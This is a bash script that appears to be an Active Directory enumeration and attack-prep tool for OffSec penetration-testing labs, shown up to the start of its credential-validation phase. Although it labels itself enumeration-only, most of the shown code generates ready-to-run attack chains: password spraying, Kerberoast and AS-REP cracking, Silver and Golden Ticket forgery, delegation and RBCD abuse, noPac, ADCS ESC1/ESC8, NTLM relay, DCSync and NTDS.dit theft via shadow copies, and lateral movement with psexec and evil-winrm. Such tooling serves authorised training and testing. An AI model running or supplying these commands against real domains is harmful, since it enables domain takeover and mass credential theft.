#!/usr/bin/env bash
#==============================================================================
# adr.sh — Active Directory Enumeration and Attack-Prep Script
#==============================================================================
# OffSec-focused. Kali-side only. ENUMERATION ONLY — no exploitation.
# Collects users, groups, computers, SPNs, AS-REP, shares, sessions.
# Generates ready-to-paste attack commands for operator review.
#
# USAGE:
#   ./adr.sh -d corp.local -u administrator -p Password1 -dc 10.10.10.5
#   ./adr.sh -d corp.local -u administrator -H :NTLMHASH -dc 10.10.10.5
#   ./adr.sh -d corp.local -u jdoe -p Pass -dc 10.10.10.5 --quick
#
# OUTPUT: ./ad/<DOMAIN>/
#
# PHASES:
#   1  Domain context (connectivity, cred validation, policy)
#   2  User enumeration (users, groups, descriptions)
#   3  Kerberos attack prep (AS-REP roast + Kerberoast — hash collection)
#   4  Computer enumeration (map hosts, OS versions)
#   5  SMB signing check (NTLM relay candidates)
#   6  BloodHound collection
#   7  Share enumeration (SYSVOL, NETLOGON, GPP check)
#   8  Session enumeration (logged-on users)
#==============================================================================

set -o pipefail
# NOT set -e: handle errors per-phase so one failure doesn't abort the run
# NOT set -u: graceful degradation requires undefined vars to be safe

#------------------------------------------------------------------------------
# COLORS & OUTPUT HELPERS (matches toolkit exactly)
#------------------------------------------------------------------------------
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
BOLD='\033[1m'
NC='\033[0m'

disable_colors() { RED='' GREEN='' YELLOW='' BLUE='' CYAN='' MAGENTA='' BOLD='' NC=''; }
{ [[ -n "${NO_COLOR:-}" ]] || [[ ! -t 1 ]]; } && disable_colors

if [[ -z "${TOOLKIT_ROOT:-}" ]]; then
    if [[ -n "${SUDO_USER:-}" ]]; then
        _inv_home=$(getent passwd "$SUDO_USER" 2>/dev/null | cut -d: -f6)
        TOOLKIT_ROOT="${_inv_home:-$HOME}/toolkit"
        unset _inv_home
    else
        TOOLKIT_ROOT="${HOME}/toolkit"
    fi
fi

ts()      { date '+%H:%M:%S'; }
info()    { echo -e "${BLUE}[$(ts)] [*]${NC} $*"; }
success() { echo -e "${GREEN}[$(ts)] [+]${NC} $*"; }
warn()    { echo -e "${YELLOW}[$(ts)] [!]${NC} $*"; }
error()   { echo -e "${RED}[$(ts)] [-]${NC} $*" >&2; }
phase()   { echo -e "\n${MAGENTA}[$(ts)] [PHASE]${NC} ${BOLD}$*${NC}"; }
cmd_log() {
    echo -e "${CYAN}[$(ts)] [CMD]${NC} $*"
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] CMD: $*" >> "${OUTDIR}/cmd_log.txt" 2>/dev/null || true
}

creds_log() {
    local creds_file="${TOOLKIT_ROOT}/creds.txt"
    mkdir -p "$(dirname "$creds_file")" 2>/dev/null || true
    if ! printf '%s | %-8s | %-15s | %-20s | %s | %s\n' \
        "$(date '+%Y-%m-%d %H:%M:%S')" "$1" "$2" "$3" "$4" "$5" >> "$creds_file" 2>/dev/null; then
        warn "CRED NOT LOGGED — cannot write to ${creds_file}"
        warn "Credential: $3@$2 : $4 ($5)"
    fi
}

#------------------------------------------------------------------------------
# PROGRESS TRACKING
# Format: TIMESTAMP | STATUS | PHASE | DETAIL
#------------------------------------------------------------------------------
progress_log() {
    # $1=status(START|DONE|FAIL|SKIP), $2=phase_key, $3=detail
    echo "$(date '+%Y-%m-%d %H:%M:%S') | $1 | $2 | $3" >> "${OUTDIR}/progress.log"
}

is_phase_done() {
    # $1=phase_key
    [[ "$FORCE_MODE" == true ]] && return 1
    grep -qF "| DONE | $1 |" "${OUTDIR}/progress.log" 2>/dev/null
}

#------------------------------------------------------------------------------
# CHILD PROCESS TRACKING (Ctrl+C cleanup)
#------------------------------------------------------------------------------
declare -a CHILD_PIDS=()

register_pid() { CHILD_PIDS+=("$1"); }

CLEANUP_RUNNING=0

cleanup() {
    local exit_code="${1:-0}"
    (( CLEANUP_RUNNING )) && return
    CLEANUP_RUNNING=1
    trap - EXIT INT TERM

    if (( ${#CHILD_PIDS[@]} > 0 )); then
        local pid
        for pid in "${CHILD_PIDS[@]}"; do
            kill -TERM "$pid" 2>/dev/null || true
        done
        sleep 1
        for pid in "${CHILD_PIDS[@]}"; do
            kill -9 "$pid" 2>/dev/null || true
        done
    fi

    if (( exit_code == 130 )); then
        echo ""
        warn "Interrupted — partial results saved to ${OUTDIR:-[not initialized]}/"
    fi
    exit "$exit_code"
}

trap 'cleanup 0'   EXIT
trap 'cleanup 130' INT TERM

#------------------------------------------------------------------------------
# GLOBAL STATE — set by argument parsing + normalize_hash
#------------------------------------------------------------------------------
DOMAIN=""
AD_USER=""
PASS=""
NT_HASH=""
LM_NT_HASH=""
DC_IP=""
DC_HOST=""
AUTH_TYPE=""          # "password" | "hash"
BASE_DN=""
OUTDIR=""
THREADS=10
SKIP_BLOODHOUND=false
SKIP_SHARES=false
QUICK_MODE=false
FORCE_MODE=false
KERBEROS=false

# Absolute directory of this script — used to emit PWD-independent attack
# commands that reference sibling scripts (sprayr.sh, crackr.sh, etc.)
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# Auth arrays — populated by build_*_auth() helpers, used by phase functions
declare -a NXC_AUTH=()
declare -a RPC_HASH_FLAG=()
declare -a SMBC_HASH_FLAG=()
declare -a IMPACKET_AUTH_ARGS=()
RPC_CRED=""
SMBC_CRED=""
IMPACKET_TARGET=""

# Tool availability: "ok" | "missing"
declare -A TOOL_STATUS=()

#------------------------------------------------------------------------------
# INPUT VALIDATION HELPERS
#------------------------------------------------------------------------------
is_valid_ip() {
    local ip="$1"
    [[ "$ip" =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]] || return 1
    local octet
    local IFS='.'
    read -ra _octs <<< "$ip"
    for octet in "${_octs[@]}"; do
        (( 10#$octet > 255 )) && return 1
    done
    return 0
}

is_positive_integer() { [[ "$1" =~ ^[1-9][0-9]*$ ]]; }

is_valid_ntlm_hash() {
    [[ "$1" =~ ^[A-Fa-f0-9]{32}$ ]]
}

is_valid_lm_nt_hash() {
    [[ "$1" =~ ^[A-Fa-f0-9]{32}:[A-Fa-f0-9]{32}$ ]]
}

domain_to_dn() {
    # corp.local → DC=corp,DC=local
    local domain="$1"
    local result=""
    local part
    local -a parts
    local IFS='.'
    read -ra parts <<< "$domain"
    for part in "${parts[@]}"; do
        if [[ -z "$result" ]]; then
            result="DC=${part}"
        else
            result="${result},DC=${part}"
        fi
    done
    echo "$result"
}

normalize_hash() {
    # Accepts: :NTLMHASH  OR  LMHASH:NTLMHASH  OR  plain NTLMHASH
    # Sets globals NT_HASH and LM_NT_HASH
    local raw="$1"
    if [[ "$raw" == :* ]]; then
        NT_HASH="${raw#:}"
        is_valid_ntlm_hash "$NT_HASH" || return 1
        LM_NT_HASH="aad3b435b51404eeaad3b435b51404ee:${NT_HASH}"
    elif [[ "$raw" == *:* ]]; then
        is_valid_lm_nt_hash "$raw" || return 1
        LM_NT_HASH="$raw"
        NT_HASH="${raw##*:}"
    else
        NT_HASH="$raw"
        is_valid_ntlm_hash "$NT_HASH" || return 1
        LM_NT_HASH="aad3b435b51404eeaad3b435b51404ee:${NT_HASH}"
    fi
}

#------------------------------------------------------------------------------
# AUTH ARRAY BUILDERS
# Call once per phase; sets global arrays used in that phase.
#------------------------------------------------------------------------------
build_nxc_auth() {
    if [[ "$AUTH_TYPE" == "hash" ]]; then
        NXC_AUTH=(-u "$AD_USER" -H "$NT_HASH" -d "$DOMAIN" -t "$THREADS")
    elif [[ "$AUTH_TYPE" == "kerberos" ]]; then
        NXC_AUTH=(-u "$AD_USER" -d "$DOMAIN" -t "$THREADS" --use-kcache)
    else
        NXC_AUTH=(-u "$AD_USER" -p "$PASS" -d "$DOMAIN" -t "$THREADS")
    fi
    [[ "$KERBEROS" == "true" && "$AUTH_TYPE" != "kerberos" ]] && NXC_AUTH+=(-k)
}

build_rpc_auth() {
    # RPC_CRED: string for -U flag.  RPC_HASH_FLAG: optional --pw-nt-hash
    if [[ "$AUTH_TYPE" == "hash" ]]; then
        RPC_CRED="${DOMAIN}/${AD_USER}%${NT_HASH}"
        RPC_HASH_FLAG=(--pw-nt-hash)
    else
        RPC_CRED="${DOMAIN}/${AD_USER}%${PASS}"
        RPC_HASH_FLAG=()
    fi
}

build_smbc_auth() {
    # SMBC_CRED: string for -U.  SMBC_HASH_FLAG: optional --pw-nt-hash
    if [[ "$AUTH_TYPE" == "hash" ]]; then
        SMBC_CRED="${DOMAIN}/${AD_USER}%${NT_HASH}"
        SMBC_HASH_FLAG=(--pw-nt-hash)
    else
        SMBC_CRED="${DOMAIN}/${AD_USER}%${PASS}"
        SMBC_HASH_FLAG=()
    fi
}

build_impacket_auth() {
    # IMPACKET_TARGET: positional arg.  IMPACKET_AUTH_ARGS: optional -hashes / -k -no-pass
    if [[ "$AUTH_TYPE" == "hash" ]]; then
        IMPACKET_TARGET="${DOMAIN}/${AD_USER}"
        IMPACKET_AUTH_ARGS=(-hashes "$LM_NT_HASH")
    elif [[ "$AUTH_TYPE" == "kerberos" ]]; then
        IMPACKET_TARGET="${DOMAIN}/${AD_USER}"
        IMPACKET_AUTH_ARGS=(-k -no-pass)
    else
        IMPACKET_TARGET="${DOMAIN}/${AD_USER}:${PASS}"
        IMPACKET_AUTH_ARGS=()
    fi
}

#------------------------------------------------------------------------------
# ATTACK COMMANDS FILE HELPER
#------------------------------------------------------------------------------
attack_cmd() {
    # $1=section title, remaining args = command lines
    local title="$1"
    shift
    {
        echo ""
        echo "════════════════════════════════════════════════════════════"
        echo "${title}"
        echo "════════════════════════════════════════════════════════════"
        local line
        for line in "$@"; do
            echo "$line"
        done
    } >> "${OUTDIR}/attack_commands.txt"
}

attack_cmd_once() {
    local title="$1"
    shift
    if grep -Fxq "${title}" "${OUTDIR}/attack_commands.txt" 2>/dev/null; then
        return 0
    fi
    attack_cmd "$title" "$@"
}

sync_next_steps_file() {
    [[ -f "${OUTDIR}/attack_commands.txt" ]] || return 0
    cp "${OUTDIR}/attack_commands.txt" "${OUTDIR}/next_steps.txt" 2>/dev/null || true
}

generate_ad_2025_next_steps() {
    local notes="${OUTDIR}/summary_notes.txt"
    local valid_context=false
    grep -qF '[+]' "${OUTDIR}/domain_context.txt" 2>/dev/null && valid_context=true

    if [[ "$valid_context" == true ]]; then
        attack_cmd_once "ON-HOST AD ENUMERATION (PowerView + SharpHound)" \
            "# Evidence: domain credential validated against ${DC_IP}" \
            "# From a Windows foothold joined to the domain:" \
            "Import-Module .\\PowerView.ps1" \
            "Get-Domain" \
            "Get-DomainUser -Properties samaccountname,description,pwdlastset,lastlogon" \
            "Get-DomainGroupMember 'Domain Admins' -Recurse" \
            "Get-DomainComputer -Properties dnshostname,operatingsystem" \
            ".\\SharpHound.exe -c All -d ${DOMAIN} --zipfilename ${DOMAIN}_sharphound.zip"
    fi

    if [[ -s "${OUTDIR}/users/all_users.txt" ]]; then
        attack_cmd_once "USERLIST WORKFLOW (lockout-aware spray + auth checks)" \
            "# Evidence: users/all_users.txt exists and is non-empty" \
            "cat ${OUTDIR}/password_policy.txt" \
            "wc -l ${OUTDIR}/users/all_users.txt" \
            "nxc smb ${DC_IP} -u ${OUTDIR}/users/all_users.txt -p 'Password1' -d ${DOMAIN} --continue-on-success" \
            "${SCRIPT_DIR}/sprayr.sh -U ${OUTDIR}/users/all_users.txt -p 'Password1' -d ${DOMAIN} -t ${DC_IP} --safe" \
            "nxc winrm ${DC_IP} -u ${OUTDIR}/users/all_users.txt -p 'Password1' -d ${DOMAIN} --continue-on-success"
    fi

    if [[ -s "${OUTDIR}/hashes/asreproast.txt" ]]; then
        attack_cmd_once "AS-REP ROAST FOLLOW-UP (crack, spray, retest)" \
            "# Evidence: hashes/asreproast.txt contains AS-REP hash material" \
            "${SCRIPT_DIR}/crackr.sh -f ${OUTDIR}/hashes/asreproast.txt" \
            "hashcat -m 18200 ${OUTDIR}/hashes/asreproast.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --show" \
            "${SCRIPT_DIR}/sprayr.sh -U ${OUTDIR}/users/all_users.txt -P ${OUTDIR}/hashes/cracked_passwords.txt -d ${DOMAIN} -t ${DC_IP} --safe" \
            "nxc smb ${DC_IP} -u ${OUTDIR}/users/asrep_candidates.txt -p '<CRACKED_PASS>' -d ${DOMAIN} --continue-on-success"
    fi

    if [[ -s "${OUTDIR}/hashes/kerberoast.txt" ]]; then
        attack_cmd_once "KERBEROAST FOLLOW-UP (crack SPNs, prioritize paths)" \
            "# Evidence: hashes/kerberoast.txt contains Kerberoast hash material" \
            "${SCRIPT_DIR}/crackr.sh -f ${OUTDIR}/hashes/kerberoast.txt" \
            "hashcat -m 13100 ${OUTDIR}/hashes/kerberoast.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --show" \
            "cat ${OUTDIR}/users/kerberoastable.txt" \
            "# In BloodHound: Kerberoastable Users with Path to Domain Admins"

        attack_cmd_once "SILVER TICKET (when a service-account NT hash is cracked but DCSync is blocked)" \
            "# Covered in PEN-200 ch 23.2.4 — forge a TGS directly for ONE service (no DC needed)." \
            "# Use AFTER crackr.sh yields a plaintext for a Kerberoastable service account." \
            "# First: compute the NT hash of the cracked password:" \
            "python3 -c 'from impacket.ntlm import compute_nthash; import sys; print(compute_nthash(sys.argv[1]).hex())' '<CRACKED_PASS>'" \
            "# Then forge a Silver Ticket for the service SPN (cifs/host/http/ldap/mssqlsvc):" \
            "impacket-ticketer -nthash <SERVICE_NT_HASH> -domain-sid <DOMAIN_SID> -domain ${DOMAIN} -spn cifs/<TARGET_HOST>.${DOMAIN} Administrator" \
            "export KRB5CCNAME=Administrator.ccache" \
            "impacket-psexec -k -no-pass <TARGET_HOST>.${DOMAIN}"
    fi

    if grep -qF "LAPS_READABLE=YES" "$notes" 2>/dev/null; then
        attack_cmd_once "LAPS FOLLOW-UP (local admin passwords readable)" \
            "# Evidence: ldap/laps.txt contains ms-Mcs-AdmPwd attribute values" \
            "cat ${OUTDIR}/ldap/laps.txt" \
            "# Extract host:password pairs and authenticate as local admin:" \
            "grep -iE 'Computer|Password' ${OUTDIR}/ldap/laps.txt" \
            "# Local-auth spray with recovered passwords (LAPS pw = local admin, not domain):" \
            "nxc smb <HOST> -u Administrator -p '<LAPS_PASSWORD>' --local-auth" \
            "evil-winrm -i <HOST> -u Administrator -p '<LAPS_PASSWORD>'"
    fi

    if grep -qF "GMSA_HASH=YES" "$notes" 2>/dev/null; then
        attack_cmd_once "gMSA FOLLOW-UP (managed service account NT hash recovered)" \
            "# Evidence: ldap/gmsa.txt contains msDS-ManagedPassword-derived NT hash" \
            "cat ${OUTDIR}/ldap/gmsa.txt" \
            "# Pass-the-Hash with the gMSA account (often tied to SQL / services / scheduled tasks):" \
            "nxc smb ${DC_IP} -u '<GMSA_ACCOUNT$>' -H '<NT_HASH>' -d ${DOMAIN}" \
            "impacket-psexec -hashes ':<NT_HASH>' ${DOMAIN}/'<GMSA_ACCOUNT$>'@${DC_IP}" \
            "# Request TGT as gMSA for Kerberos-only services:" \
            "impacket-getTGT -hashes ':<NT_HASH>' ${DOMAIN}/'<GMSA_ACCOUNT$>'"
    fi

    if grep -qF "UNCONSTRAINED_DELEGATION=YES" "$notes" 2>/dev/null; then
        attack_cmd_once "UNCONSTRAINED DELEGATION FOLLOW-UP (coerce + TGT capture)" \
            "# Evidence: ldap/delegation.txt lists hosts with TRUSTED_FOR_DELEGATION" \
            "grep -iE 'Unconstrained' ${OUTDIR}/ldap/delegation.txt" \
            "# On the unconstrained host (once you have local admin), monitor LSASS for captured TGTs:" \
            "# 1. Run rubeus monitor / impacket-secretsdump -just-dc on gathered TGT" \
            "# 2. Coerce a DC to authenticate to the unconstrained host:" \
            "impacket-printerbug ${DOMAIN}/${AD_USER}@${DC_IP} <UNCONSTRAINED_HOST>" \
            "python3 PetitPotam.py -u ${AD_USER} -p '<PASS>' -d ${DOMAIN} <UNCONSTRAINED_HOST> ${DC_IP}" \
            "# 3. On unconstrained host: rubeus monitor /interval:5 /filteruser:<DC_HOSTNAME>$" \
            "# 4. Replay DC TGT: impacket-secretsdump -just-dc -k -no-pass ${DOMAIN}/<DC_HOSTNAME>\$@${DC_IP}"
    elif grep -qF "DELEGATION_FOUND=YES" "$notes" 2>/dev/null; then
        attack_cmd_once "DELEGATION FOLLOW-UP (constrained / RBCD abuse)" \
            "# Evidence: ldap/delegation.txt lists accounts with AllowedToDelegateTo / RBCD" \
            "cat ${OUTDIR}/ldap/delegation.txt" \
            "# Constrained delegation (S4U2Self + S4U2Proxy) — request service ticket as DA:" \
            "impacket-getST -spn cifs/<TARGET> -impersonate Administrator ${DOMAIN}/'<SVC_ACCT>':'<PASS>'" \
            "# RBCD (msDS-AllowedToActOnBehalfOfOtherIdentity):" \
            "impacket-rbcd -delegate-from '<CONTROLLED_COMPUTER\$>' -delegate-to '<TARGET\$>' -action write ${DOMAIN}/${AD_USER}:'<PASS>'" \
            "impacket-getST -spn cifs/<TARGET> -impersonate Administrator -dc-ip ${DC_IP} ${DOMAIN}/'<CONTROLLED_COMPUTER\$>':'<PASS>'" \
            "export KRB5CCNAME=Administrator.ccache && impacket-psexec -k -no-pass <TARGET>"
    fi

    if grep -qF "ADCS_VULNERABLE=YES" "$notes" 2>/dev/null; then
        attack_cmd_once "ADCS FOLLOW-UP (certipy-ad — ESC1/ESC2/ESC4/ESC8 exploit paths)" \
            "# Evidence: adcs/certipy_find.txt lists vulnerable templates" \
            "grep -iE 'ESC[0-9]+|Vulnerable|Template Name' ${OUTDIR}/adcs/certipy_find.txt" \
            "# ESC1 — request cert with alternate SAN (UPN) as any user:" \
            "certipy-ad req -u ${AD_USER}@${DOMAIN} -p '<PASS>' -ca '<CA_NAME>' -template '<VULN_TEMPLATE>' -upn administrator@${DOMAIN} -dc-ip ${DC_IP}" \
            "# Authenticate with recovered cert → get NT hash (Pass-the-Certificate):" \
            "certipy-ad auth -pfx administrator.pfx -dc-ip ${DC_IP}" \
            "# ESC8 — NTLM relay to AD CS HTTP endpoint (requires signing disabled on CA host):" \
            "sudo impacket-ntlmrelayx -t http://<CA>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController" \
            "# Pass-the-Hash once NT recovered:" \
            "nxc smb ${DC_IP} -u administrator -H '<NT_HASH>' --sam"
    fi

    local maq_val=""
    maq_val=$(grep -oP '(?<=MAQ=)[0-9]+' "$notes" 2>/dev/null | head -1 || true)
    if [[ -n "$maq_val" ]] && (( maq_val > 0 )); then
        attack_cmd_once "MACHINE ACCOUNT QUOTA FOLLOW-UP (MAQ=${maq_val} — noPac / RBCD prep)" \
            "# Evidence: ms-DS-MachineAccountQuota=${maq_val} — any domain user can create up to ${maq_val} computer account(s)" \
            "# 1. Create a computer account under your control:" \
            "impacket-addcomputer -computer-name 'PWN\$' -computer-pass 'Pwn3dP@ss!' ${DOMAIN}/${AD_USER}:'<PASS>' -dc-ip ${DC_IP}" \
            "# 2. RBCD: grant PWN\$ delegation rights on a target computer (requires GenericWrite on target):" \
            "impacket-rbcd -delegate-from 'PWN\$' -delegate-to '<TARGET\$>' -action write ${DOMAIN}/${AD_USER}:'<PASS>' -dc-ip ${DC_IP}" \
            "# 3. Request service ticket as Administrator via S4U2Proxy:" \
            "impacket-getST -spn cifs/<TARGET> -impersonate Administrator -dc-ip ${DC_IP} ${DOMAIN}/'PWN\$':'Pwn3dP@ss!'" \
            "export KRB5CCNAME=Administrator.ccache && impacket-psexec -k -no-pass ${DOMAIN}/Administrator@<TARGET>" \
            "# Alternative — noPac (CVE-2021-42278/42287, patched on updated DCs):" \
            "impacket-noPac -dc-ip ${DC_IP} -dc-host '<DC_HOSTNAME>' '${DOMAIN}/${AD_USER}:<PASS>' -shell --impersonate administrator"
    fi

    if grep -qF "DOMAIN_TRUSTS=YES" "$notes" 2>/dev/null; then
        attack_cmd_once "DOMAIN TRUST FOLLOW-UP (forest / cross-domain attacks)" \
            "# Evidence: ldap/trusts.txt lists inter-domain trust relationships" \
            "cat ${OUTDIR}/ldap/trusts.txt" \
            "# Enum users / admins in trusted domain via current creds:" \
            "nxc ldap ${DC_IP} ${NXC_AUTH[*]} --users -d '<TRUSTED_DOMAIN>'" \
            "# SID history abuse (if you own the trust side with DCSync):" \
            "impacket-secretsdump -just-dc ${DOMAIN}/${AD_USER}:'<PASS>'@${DC_IP}  # get krbtgt of current domain" \
            "impacket-ticketer -nthash '<PARENT_KRBTGT_NT>' -domain-sid '<CURRENT_SID>' -domain ${DOMAIN} -extra-sid '<TRUSTED_DOMAIN_SID>-519' Administrator"
    fi

    if [[ -s "${OUTDIR}/computers/nxc_computers.txt" || -s "${OUTDIR}/computers/all_computers.txt" ]]; then
        attack_cmd_once "LATERAL MOVEMENT AUTH CHECKS (WinRM, WMI, PsExec, DCOM)" \
            "# Evidence: AD computer enumeration produced host data" \
            "nxc smb ${DC_IP} ${NXC_AUTH[*]} --local-auth" \
            "nxc winrm ${DC_IP} ${NXC_AUTH[*]}" \
            "evil-winrm -i ${DC_IP} -u ${AD_USER} -p '<PASS_OR_HASH>'" \
            "impacket-psexec ${DOMAIN}/${AD_USER}:'<PASS>'@${DC_IP}" \
            "impacket-wmiexec ${DOMAIN}/${AD_USER}:'<PASS>'@${DC_IP}" \
            "impacket-dcomexec ${DOMAIN}/${AD_USER}:'<PASS>'@${DC_IP}"
    fi

    if grep -qF "SMB_SIGNING_DISABLED=YES" "$notes" 2>/dev/null || [[ -s "${OUTDIR}/smb_no_signing.txt" ]]; then
        attack_cmd_once "NTLM RELAY FOLLOW-UP (Responder + ntlmrelayx)" \
            "# Evidence: SMB signing disabled or relay candidate list exists" \
            "cat ${OUTDIR}/smb_no_signing.txt" \
            "sudo responder -I tun0 -dwP" \
            "sudo impacket-ntlmrelayx -tf ${OUTDIR}/smb_no_signing.txt -smb2support --dump" \
            "sudo impacket-ntlmrelayx -tf ${OUTDIR}/smb_no_signing.txt -smb2support -c 'whoami'"
    fi

    if grep -qF "ADMIN_ON_DC=YES" "$notes" 2>/dev/null; then
        attack_cmd_once "DOMAIN ADMIN PATH (DCSync, pass-the-hash, pass-the-ticket)" \
            "# Evidence: validated account reported Pwn3d/admin on DC" \
            "$(if [[ "$AUTH_TYPE" == "hash" ]]; then echo "impacket-secretsdump -just-dc ${DOMAIN}/${AD_USER}@${DC_IP} -hashes ${LM_NT_HASH}"; else echo "impacket-secretsdump -just-dc ${DOMAIN}/${AD_USER}:${PASS}@${DC_IP}"; fi)" \
            "nxc smb ${DC_IP} ${NXC_AUTH[*]} --ntds" \
            "impacket-psexec -hashes '<LM:NT>' ${DOMAIN}/Administrator@${DC_IP}" \
            "impacket-ticketer -nthash <KRBTGT_NT_HASH> -domain-sid <DOMAIN_SID> -domain ${DOMAIN} Administrator" \
            "export KRB5CCNAME=Administrator.ccache && impacket-psexec -k -no-pass ${DOMAIN}/Administrator@${DC_IP}"

        attack_cmd_once "SHADOW COPIES FALLBACK (when DCSync is blocked but you have a shell as local admin on DC)" \
            "# Use when impacket-secretsdump -just-dc fails (signing/firewall/EDR) but you can run code on the DC as admin." \
            "# Covered in PEN-200 ch 24.2.2." \
            "# On DC (cmd as admin):" \
            "vssadmin create shadow /for=C:" \
            "copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\ntds.dit C:\\Temp\\ntds.dit" \
            "reg save HKLM\\SYSTEM C:\\Temp\\SYSTEM" \
            "# Exfil both to Kali (e.g. servr.sh), then offline dump:" \
            "impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL"

    fi

    if grep -qF "PRIV_SESSIONS=YES" "$notes" 2>/dev/null; then
        attack_cmd_once "PRIVILEGED SESSION FOUND (target token/host)" \
            "# Evidence: sessions output contains privileged/admin session markers" \
            "cat ${OUTDIR}/sessions/smb_sessions.txt" \
            "cat ${OUTDIR}/sessions/loggedon_users.txt" \
            "# If you gain code execution on that host: enumerate tokens and try local privilege/token abuse" \
            "nxc smb <HOST_WITH_PRIV_SESSION> ${NXC_AUTH[*]} --sam --lsa"
    fi

    local bh_zip=""
    bh_zip=$(find "${OUTDIR}/bloodhound" -maxdepth 1 -name '*.zip' -print 2>/dev/null | head -1)
    if [[ -n "$bh_zip" && -s "$bh_zip" ]]; then
        attack_cmd_once "BLOODHOUND 2025-2026 REVIEW QUEUE" \
            "# Evidence: BloodHound collection zip exists" \
            "echo '${bh_zip}'" \
            "# Review: Shortest Paths to Domain Admins" \
            "# Review: Kerberoastable Users with Path to DA" \
            "# Review: AS-REP Roastable Users" \
            "# Review: Users with DCSync Rights" \
            "# Review: Computers where Owned Principals are Local Admin"
    fi

    if [[ -s "${OUTDIR}/shares/sysvol_interesting.txt" ]]; then
        attack_cmd_once "SYSVOL/SHARE LOOT REVIEW" \
            "# Evidence: share enumeration found interesting SYSVOL filenames" \
            "cat ${OUTDIR}/shares/sysvol_interesting.txt" \
            "grep -RniE 'pass|password|cred|secret|admin|token|key' ${OUTDIR}/shares 2>/dev/null | head -100" \
            "find ${OUTDIR}/shares -type f \\( -iname '*.ps1' -o -iname '*.bat' -o -iname '*.cmd' -o -iname '*.xml' -o -iname '*.config' \\) -print"
    fi

    sync_next_steps_file
}

#------------------------------------------------------------------------------
# PRE-FLIGHT TOOL CHECK
#------------------------------------------------------------------------------
check_tools() {
    info "Checking tool availability..."
    local tool

    # Critical — exit if missing
    if command -v nxc &>/dev/null; then
        TOOL_STATUS[nxc]="ok"
        success "  [+] nxc (critical)"
    else
        TOOL_STATUS[nxc]="missing"
        error "CRITICAL: nxc not found. Install: sudo apt install netexec"
        exit 1
    fi

    # Important — warn if missing, skip dependent phases
    local important_tools=(
        impacket-GetUserSPNs
        impacket-GetNPUsers
        ldapsearch
        rpcclient
        smbclient
        enum4linux-ng
    )
    for tool in "${important_tools[@]}"; do
        if command -v "$tool" &>/dev/null; then
            TOOL_STATUS[$tool]="ok"
            success "  [+] ${tool}"
        else
            TOOL_STATUS[$tool]="missing"
            warn "  [!] ${tool} not found — dependent enumeration will be skipped"
        fi
    done

    # Optional — skip phase if missing
    local optional_tools=(bloodhound-ce-python dig)
    for tool in "${optional_tools[@]}"; do
        if command -v "$tool" &>/dev/null; then
            TOOL_STATUS[$tool]="ok"
            success "  [+] ${tool} (optional)"
        else
            TOOL_STATUS[$tool]="missing"
            warn "  [!] ${tool} not found"
            [[ "$tool" == "bloodhound-ce-python" ]] && \
                warn "      Install: pip install bloodhound-ce  OR  sudo apt install bloodhound-ce-python"
        fi
    done
}

#==============================================================================
# PHASE 1 — DOMAIN CONTEXT
#==============================================================================
phase1_domain_context() {
    local phase_key="phase1_domain_context"
    if is_phase_done "$phase_key"; then
        info "Phase 1 already complete (--force to redo)"
        return 0
    fi

    phase "1 — Domain Context (connectivity + credential validation)"
    progress_log "START" "$phase_key" "domain=${DOMAIN} dc=${DC_IP}"

    info "Reminder: try null/anonymous auth BEFORE adr.sh on fresh engagements"
    info "  nxc smb ${DC_IP} -u '' -p ''          # null-auth enumeration"
    info "  nxc smb ${DC_IP} -u 'guest' -p ''     # guest-auth"
    info "  nxc smb ${DC_IP} -u '' -p '' --pass-pol   # policy without creds"
    info "  rpcclient -U '' -N ${DC_IP}           # then: enumdomusers / querydispinfo"

    # Always emit the null/anon recipe block (independent of current creds)
    attack_cmd_once "NULL / ANONYMOUS BIND ENUMERATION (no creds required)" \
        "# Run these FIRST on any fresh DC — many labs leak on null bind" \
        "nxc smb ${DC_IP} -u '' -p ''" \
        "nxc smb ${DC_IP} -u 'guest' -p ''" \
        "nxc smb ${DC_IP} -u '' -p '' --pass-pol" \
        "nxc ldap ${DC_IP} -u '' -p '' --users --pass-pol" \
        "rpcclient -U '' -N ${DC_IP} -c 'enumdomusers'" \
        "rpcclient -U '' -N ${DC_IP} -c 'querydispinfo'" \
        "rpcclient -U '' -N ${DC_IP} -c 'lsaquery'" \
        "smbclient -L //${DC_IP}/ -N" \
        "impacket-lookupsid ${DOMAIN}/guest@${DC_IP}   # leave password prompt empty"

    # 1a. Ping
    if timeout 10 ping -c1 -W3 "$DC_IP" &>/dev/null; then
        success "DC reachable via ICMP"
    else
        warn "Ping blocked — continuing with TCP checks"
    fi

    # 1b. TCP port probe (445, 389)
    local port
    for port in 445 389; do
        # shellcheck disable=SC2016
        if timeout 5 bash -c '>/dev/tcp/$1/$2' bash "$DC_IP" "$port" 2>/dev/null; then
            success "TCP ${port} open"
        else
            warn "TCP ${port} appears closed or filtered"
        fi
    done

    # 1b2. Clock skew check vs DC (Kerberos fails with >5min skew)
    if command -v rdate &>/dev/null; then
        local dc_epoch local_epoch skew
        dc_epoch=$(timeout 5 rdate -p -n "$DC_IP" 2>/dev/null \
            | awk '{$1=""; sub(/^ /, ""); print}' \
            | { read -r d; date -d "$d" +%s 2>/dev/null || true; })
        local_epoch=$(date +%s)
        if [[ "$dc_epoch" =~ ^[0-9]+$ ]]; then
            skew=$(( dc_epoch > local_epoch ? dc_epoch - local_epoch : local_epoch - dc_epoch ))
            if (( skew > 300 )); then
                warn "*** CLOCK SKEW ${skew}s vs DC — Kerberos will fail (>300s limit) ***"
                warn "Fix: sudo rdate -n ${DC_IP}   (or sudo ntpdate -s ${DC_IP})"
                echo "CLOCK_SKEW=${skew}" >> "${OUTDIR}/summary_notes.txt"
            else
                info "Clock skew vs DC: ${skew}s (within Kerberos tolerance)"
            fi
        else
            info "Clock-skew check skipped (could not parse rdate output)"
        fi
    else
        info "rdate not installed — skipping clock-skew check (apt install rdate)"
    fi

    # 1c. Credential validation via nxc
    build_nxc_auth
